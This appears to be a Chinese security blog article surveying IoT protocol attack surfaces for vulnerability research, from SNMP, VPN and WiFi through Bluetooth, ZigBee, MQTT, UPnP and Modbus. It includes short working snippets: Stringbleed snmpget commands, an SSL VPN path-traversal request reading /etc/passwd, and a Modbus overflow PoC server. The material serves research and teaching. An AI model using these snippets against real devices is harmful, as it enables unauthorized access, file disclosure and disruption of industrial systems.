> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIwNTU1NjYwNA==&mid=2247488098&idx=1&sn=606e1b3436b86a4d87471c8897423c14

#  IoT漏洞挖掘中常见的协议  
 骇极安全   2025-06-27 08:59  
  
![](https://mmecoa.qpic.cn/mmecoa_jpg/ZqGlvGe4x9SU4NBglfSEhxz7iciaAvvrQ1RYCAqhQEOkiarKVPmlDzr7F3uJfiabKEWgcG8DPvhTHicA5rOwLYLPUGw/640?wx_fmt=jpeg&from=appmsg "")  
  
IOT  
模型一般分为感知层、传输层、应用层，本篇将探讨  
IOT  
漏洞研究中传输层的协议分析。当然由于研究角度不同也会出现四层、五层的分类模型，但从整体脆弱性作漏洞风险分析，无非是设备终端、管理软件  
(APP/Browser)  
、服务  
(  
云  
)  
平台三个端点，以及这三个点相互的数据传输。  
  
  
  
三个端点通信的模块是接口，接口的连线就是通信协议，接口和连线都会有漏洞隐患，也是本文讨论的主题，  
web  
协议之前已经单做讨论，这里不再赘述，下面主要从  
“  
通用  
”  
协议、  
“  
专用  
”  
协议和  
“  
专有  
”  
协议三个方面作漏洞分析。由于笔者词穷，并没有想到好的标题表达自己的分类方式，而且也仅限个人想法并非权威，所以都打上引号。  
### 一、通用协议  
  
这里的  
“  
通用  
”  
协议指的是不仅在  
IOT  
上使用的一般网络协议，可以是有线也可以是无线。由于这些协议的研究手法比较通用，这里只作简单介绍。  
  
•  
  
SSH  
  
SSH(Secure Shell)  
是大家最熟悉的远程管理协议之一，许多设备都提供了该接口。  
SSH  
最大的隐患当然是弱口令爆破攻击，下面几种协议亦然，当然，除了爆破认证绕过也是此类协议漏洞挖掘的重要方向。由于实现代码已经比较成熟，设备存在  
SSH  
漏洞案例不多，但也并非全然没有安全隐患，研究时可以作一些协议上的  
fuzz  
。  
  
•  
  
Telnet  
  
Telnet  
被认为是  
SSH  
低配版，安全性也较低。研究者一般在漏洞利用中会打开  
telnetd  
服务获取  
shell  
，  
Telnet  
协议比较简单，可以利用或自己开发一些  
fuzz  
工具对设备进行测试。  
  
•  
  
FTP  
  
FTP/SMB  
在设备中也比较常见，也有些溢出漏洞的案例，通过二进制危险函数审计或者借助  
fuzz  
工具一般很快可以定位。  
  
•  
  
SNMP  
  
SNMP  
如果实现不当，有敏感信息泄露的隐患，甚至可以直接控制设备。比如前几年的某网关设备，由于代码中没有正确处理  
community  
认证，导致任意  
community  
均可以通过认证，直接使用  
snmpget  
命令发送  
 SNMP GET  
请求，并指定任意字符串作为  
community  
均可通过认证。  
  
snmpget -v 1 -c public $IP iso.3.6.1.2.1.1.1.0  
  
snmpget -v 1 -c '#Stringbleed' $IP iso.3.6.1.4.1.4491.2.4.1.1.6.1.1.0  
  
snmpget -v 1 -c '#Stringbleed' $IP iso.3.6.1.4.1.4491.2.4.1.1.6.1.2.0  
  
•  
  
(SSL/Ipsec) VPN  
  
边界和防护设备一般会提供  
VPN  
功能，尤其疫情期间，远程办公需求不断增加，在零信任还没普及落地前  
VPN  
仍是不二之选。有些厂商会将其集成到  
web  
中，方便使用的同时也带来不少安全隐患。比如某边界设备由于  
sslvpn  
功能实现不当造成登录等敏感信息泄漏问题。  
  
import requests  
  
  
r = requests.get('<https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/>')  
  
  
print r.content  
  
  
对于这些协议除了上述专用测试工具以外，研究中还会使用到一些集成工具或  
fuzz  
框架，以  
sulley(  
不再更新  
)  
为代表，大致思路都差不多，比如  
boofuzz  
，  
kitty  
，或是比较新的  
Fuzzowski  
等，这些工具文末会作介绍。  
  
![](https://mmecoa.qpic.cn/mmecoa_jpg/ZqGlvGe4x9SU4NBglfSEhxz7iciaAvvrQ12fZ4PtZ0QXLhRD0T5evibSMlodSx2vZJiaADkAbgJV2nqrHYnIFm0yUA/640?wx_fmt=jpeg&from=appmsg "")  
### 二、专用协议  
  
所谓  
“  
专用  
”  
协议就是一般只在设备上采用，即之前章节提到的  
IOT  
无线电研究范畴。由于篇幅限制，下文重点介绍这些协议常见的攻击方式和漏洞点，对协议细节不再赘述。  
#### 2.1 WiFi  
  
WIFI  
是一种标准，且  
PC  
上也广泛使用，但作为无线路由的重要功能点，设备  
wifi  
模块中也可能存在的一些协议漏洞。爆破和中间人攻击最为常见，此外还有其他协议漏洞点。  
  
•  
  
Krack  
  
密钥重装攻击(Key Reinstallation Atacks， 即Krack)，该攻击对加密安全构成理论性的威胁，某些条件下，可以恢复用户明文数据、实施重放攻击、或者会话劫持。  
  
  
攻击者与  
station  
完成四次握手，但不转发四次握手的第四帧  
Msg4  
给  
AP  
。此时  
station  
认为四次握手完成，开始加密并发送数据，  
AP  
会重传  
Msg3  
，  
station  
收到重传的  
Msg3  
后重装会话密钥  
PTK  
，重置报文序号，重置密钥流，重新开始加密数据。  
  
•  
  
Kr00k  
  
Kr00k  
是  
2020  
年  
2  
月份  
RSA  
大会上披露的一个漏洞  
CVE-2019-15126  
，由芯片驱动实现问题造成，主要影响  
Broadcom  
和  
Cypress  
网卡。  
  
  
其核心漏洞点是在解除客户端关联后，其  
PTK  
会被置零，但是  
WiFi  
芯片会继续用置零的  
PTK  
发送缓冲中剩余的无线数据，攻击者收到这些数据后使用全零的  
PTK  
即可解密。  
#### 2.2 RFID  
  
RFID(Radio Frequency Identification)，即射频识别，是自动识别技术的一种，生活中的各种智能卡和RFID技术关系密切。说到RFID，一般都会提起现在应用广泛的NFC(Near Field Communication)近场通信，NFC可以看作是RFID的子集，物理层、协议层遵循RFID标准，只是应用层协议不同。  
  
RFID  
涉及的通信基础较多，以下是  
RFID  
常用的几种攻击方式。  
  
•  
嗅探攻击  
  
                
  
  
•  
伪造数据越权读写  
  
  
•  
存储数据篡改  
  
  
•  
攻击中间件和后端系统  
  
  
除此之外还有其他的一些攻击手段，比如频率干扰等，这里不再一一列举。  
#### 2.3 Bluetooth  
  
蓝牙是  
IOT  
设备中常用的传输方式，现在的智能家庭网除了使用  
WIFI  
，蓝牙传输也是重要手段。蓝牙这个名称十分有趣，来自十世纪一位丹麦国王  
Harald Blatand  
，  
Blatand  
在英文里可以被解释为  
Bluetooth  
，因为国王喜欢吃蓝梅，牙龈每天都是蓝色的而得名。 由于蓝牙  
(BLE)  
实现功耗逐步降低，包括手机在内的许多设备都默认打开，进一步增加了安全隐患。  
  
•  
  
BleedingBit  
  
BleedingBit由Armis的安全研究人员发现，漏洞存在于德州仪器生产的BLE芯片中，影响Cisco、Meraki、Aruba等多家公司设备。BleedingBit包括BleedingBit RCE(CVE-2018-16986)和BleedingBit OAD RCE(CVE-2018-7080)两个漏洞。  
  
•  
  
BleedingBit RCE  
  
首先发送正常广播信息，这些信息被接收并存储到目标设备中；继续发送恶意数据包，数据包特定头信息置位改变，从而触发漏洞。  
  
•  
  
BleedingBit OAD RCE  
  
利用自己修改过的固件覆盖原先的系统，从而控制目标设备。  
  
•  
  
BIAS  
  
BIAS(Bluetooth Impersonation AttackS)，即蓝牙冒充攻击。Bluetooth BR/EDR中被发现了一些严重的安全漏洞，包括缺乏强制相互身份认证、角色转化过度轻松、认证过程降级等。攻击者利用该漏洞可以打破标准适配设备的蓝牙安全机制，最后可以在安全连接建立后仿冒已配对设备发送数据。  
从本质上说，  
BIAS  
攻击是利用了蓝牙设备如何处理长期连接的漏洞。  
  
#### 2.4 zigbee  
  
ZigBee  
是比较新的无线通信技术，适用于短距离设备之间数据传输。  
Zigbee  
与蓝牙相比能建立更大的网络，功耗比起  
wifi  
相对要低不少，所以经常在家庭、工厂等应用场景使用。  
  
ZigBee  
协议分为物理层、  
MAC  
层、网络称和应用层  
4  
层  
:  
  
提供  
3  
个等级的安全模式：  
  
  
  
•  
  
非安全模式：不采取任何安全服务，容易被窃听；  
  
•  
  
访问控制模式：通过  
ACL  
限制非法节点；  
  
•  
  
安全模式：采用AES 128位加密通信。  
  
Zigbee  
常见攻击方式：  
  
•  
  
数据窃听  
  
当  
ZigBee  
使用非安全模式，也就是其默认安全策略时，对传输数据将不作加密，所以可以通过嗅探窃听到传输数据。  
  
•  
  
密钥攻击  
  
在密钥传输过程中，可能会以明文形式传输密钥，因此有被窃取密钥的风险。  
  
![](https://mmecoa.qpic.cn/mmecoa_jpg/ZqGlvGe4x9SU4NBglfSEhxz7iciaAvvrQ1XxHBYz0dYhjSe9Aun5TibRPicquusF1a6iblFVmn5yAcdts8Wh1rOQOgQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
目前针对  
ZigBee  
的攻击，主要还是窃听和密钥安全方向，比较流行的研究工具有  
KillerBee  
，可实现抓包、分析和发包等功能。虽然  
ZigBee  
没有  
WiFi  
、蓝牙那样流行，但其安全问题仍不容忽视。  
#### 2.5 MQTT  
  
MQTT(Message Queuing Telemetry Transport  
，消息队列遥测传输协议  
)  
是一个基于客户端  
-  
服务器的消息发布  
/  
订阅传输协议。  
MQTT  
协议轻量、简单、开放和易于实现的，这些特点使它广泛使用于卫星链路通信传感器、医疗设备、智能家居、及一些小型化设备中。  
  
MQTT  
可能存在的攻击点：  
  
  
•  
  
使用匿名访问规则则，可能导致信息泄漏或者被恶意攻击者发起恶意指令；  
  
•  
  
数据未开启加密，可能导致中间人攻击或泄漏用户名  
/  
密码；  
  
•  
  
弱口令问题，传统的安全隐患；  
  
•  
  
订阅端明文配置导致泄漏用户名  
/  
密码；  
  
•  
  
服务端软件缺陷，或者订阅端或服务端解析漏洞。  
  
MQTT  
比较流行的安全测试工具有  
mqtt-pwn  
，集成扫描、爆破和利用等多种功能。  
  
#### 2.6 LoRaWAN  
  
大家可能对  
loRaWAN  
协议相对陌生，  
LoRaWAN  
是一个开放标准，它定义了基于  
LoRa  
芯片的  
LPWAN  
技术的通信协议。  
LoraWAN  
相对于  
NB-IoT  
、蜂窝更加灵活，同时更节省成本，在智能城市、智能建筑、智能机场、智能工厂等适用场景潜力巨大。  
  
  
新的协议实现必然伴随新的安全风险，  
LoRaWAN  
母公司在  
Github  
上开源的  
LoRaMac-Node  
项目被爆出存在漏洞  
(CVE-2020-11068)  
，该项目用于实现  
LoRaWAN  
节点协议栈，漏洞影响在  
4.4.2-rc.1  
至  
4.4.4  
之前版本。  
  
漏洞发生在入网流程中，接收数据时发生溢出，可对正在入网的设备造成危害。  
  
对于  
LoRaWAN  
的研究除了从上面的源码角度，针对特定设备还可以利用直接从数据分析，协议  
fuzz  
等手段。比如可利用  
LoRa Craft  
一些脚本作数据解析。  
  
>>> import binascii  
>>> from layers.loraphy import *  
  
  
>>> pkt = "18 31 10 40 ad 15 00 60 00 00 00 03 ca fe ff ff ff ff ff ff ff ff ff 6e 5a d7 0d 59 2e"  
  
  
>>> l_pkt = LoRa(binascii.unhexlify(pkt.replace(" ", ""))  
  
... )  
  
>>> l_pkt.show()  
  
###[ LoRa ]###  
  
Preamble  
= 0x1  
  
PHDR  
        
= 0x8311  
  
PHDR_CRC  
= 0x0  
  
MType  
       
= Unconfirmed Data Up  
  
RFU  
         
= 0  
  
Major  
       
= 0  
  
\\DevAddr  
     
\\  
  
     
|###[ DevAddrElem ]###  
  
     
|  
NwkID  
      
= 0xad  
  
     
|  
NwkAddr  
= 0x600015  
  
\\FCtrl  
       
\\  
  
     
|###[ FCtrl_UpLink ]###  
  
     
|  
ADR  
        
= 0  
  
     
|  
ADRACKReq = 0  
  
     
|  
ACK  
        
= 0  
  
     
|  
ClassB  
     
= 0  
  
     
|  
FOptsLen  
= 0  
  
FCnt  
        
= 0  
  
FPort  
       
= 3  
  
DataPayload= '\\xca\\xfe\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff'  
  
MIC  
         
= 0x6e5ad70d  
  
CRC  
         
= 0x592e  
#### 2.7 UPnP  
  
通用即插即用(Universal Plug and Play，简称UPnP)是由“通用即插即用论坛”(UPnP™ Forum)推广的一套网络协议。UPnP和上述协议不在一个层面，这里之所以单列出来是由于UPnP俨然成为危险协议，简单搜索如下所示：  
  
  
可以看到  
UPnP  
漏洞问题层出不穷，笔者之前也有一篇  
文章  
对  
UPnP  
栈溢出漏洞作过分析。  
UPnP  
很多实现漏洞都出在  
SSDP(Simple Service Discovery Protocol)  
协议阶段，该协议通过  
UDP 1900  
端口提供网络内发现设备的机制。  
  
除了溢出漏洞，可能还会存在注入  
(  
就是这么神奇，不然怎么称得上危险协议  
)  
，比如某路由器，攻击者可以在  
 SSDP M-SEARCH discover   
包的  
Search Target  
域来实现命令注入。  
  
![](https://mmecoa.qpic.cn/mmecoa_jpg/ZqGlvGe4x9SU4NBglfSEhxz7iciaAvvrQ1rG1ofnkHnm67Mllr2NfQIUFuKROrCy3paNIxfXwpXxbcsia9iaYIAhhA/640?wx_fmt=jpeg&from=appmsg "")  
  
### 三、专有协议  
  
“  
专有  
”  
协议是指只在某些或一类设备上使用的协议，一般由厂家自己实现，便于管理设备或设备间通信。此类协议较多，下文列举几个有代表性的抛砖引玉。由于下一篇会着重介绍  
APP  
内容，通过  
APP  
端研究协议漏洞在这里不再赘述。  
#### 3.1 TDDP  
  
TDDP  
是基于  
UDP  
，用于调试的简单协议，该协议由  
TP-Link  
开发使用，在载荷中使用不同的消息类型来完成请求。  
  
  
这种私有管理协议是我们探究的重点，因为往往越少使用到或者比较新的协议，实现代码出现漏洞的概率很大。从某使用该协议的设备看出该协议使用  
UDP 1040  
端口  
:   
通过二进制审计发现一个内存拷贝函数，导致了一个溢出漏洞。  
  
#### 3.2 Modbus  
  
Modbus  
是工业电子设备之间相当常用的连接协议，一般使用  
UDP502  
端口，是工控专有协议。因其协议简单而得到广泛使用，不同厂商设备协议实现可能不完全相同，但都是官方标准的变体。协议实现有差别，代码自然有出入，上文也提到，一旦一个标准出现很多实现代码，那漏洞几乎不可避免。  
  
Modbus/TCP OPC Server 3.0.2之前存在堆溢出漏洞，可造成DOS或RCE，对于工控设备来说，DOS已经是致命的。  
  
# POC   
关键代码  
  
  
#!/usr/bin/python  
  
  
import sys  
  
import socket  
  
  
port=502  
  
  
resp="\\x00\\x00"+"\\x00\\x00"+"\\x02\\x01"+"\\x00"+"\\x03"+"\\x02"+"\\x00\\x00" # break @ 40832c, dump edi, keep hitting f9 and watch (debug)  
  
  
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
  
sock.bind(("",port))  
  
sock.listen(1)  
  
conn,addr=sock.accept()  
  
  
req=conn.recv(32)  
  
conn.send(resp)  
  
conn.close()  
  
此类工控协议实现代码的安全性相对较弱，一般漏洞研究方法是协议  
fuzz  
，随着工控安全重要性提上日程，此类协议测试工具也是越来越多，除了传统的  
peach  
，  
boofuzz  
，还有针对性较强的  
smod  
框架等。  
#### 3.3 CLI (command line interface)  
  
CLI是人与设备的交互接口，简单来说就是订制(限制)功能的shell，一般需要手动配置的设备，例如交换机、路由器、防火墙和一些专用设备会提供该接口。CLI一方面方便配置，另一方面也是避免提供高权限shell(RTOS可能没有shell)，所以一般会运行在低权限下。对于CLI的漏洞研究，我们要可以考虑：  
  
•  
  
是否有危险函数直接导致注入溢出等漏洞，能够实现  
CLI  
不具备的功能；  
  
•  
  
是否通过组合某些  
CLI  
命令实现越权  
(  
读写  
)  
；  
  
•  
  
配置中如果需要高权限怎样实现(SUID/socket等IPC通信)，鉴权是否存在漏洞；  
  
•  
  
CLI  
漏洞针对性较强，这里就不举具体实例，但对  
CLI  
研究一定是此类设备漏洞挖掘的重要步骤。  
  
![](https://mmecoa.qpic.cn/mmecoa_jpg/ZqGlvGe4x9SU4NBglfSEhxz7iciaAvvrQ1jMFOebZeyf2icKtQe5RbqTuWLdSWh6zVsApGHic5eXQtcUbh2OBd0DCQ/640?wx_fmt=jpeg&from=appmsg "")  
### 四、协议漏洞挖掘流程  
  
协议的问题一般分为设计问题和实现问题，大部分协议问题是实现代码有漏洞。 漏洞挖掘的方法和流程如下图所示：  
  
### 五、总结  
  
IOT  
协议和实现接口的研究是漏洞挖掘中的重要环节，除了使用一些网络传统协议，还有一些设备专有协议，在许多设备漏洞研究中免不了和硬件打交道。逆向是不可或缺的手段，为提高研究效率还经常会使用一些协议  
fuzz  
和测试的工具。  
  
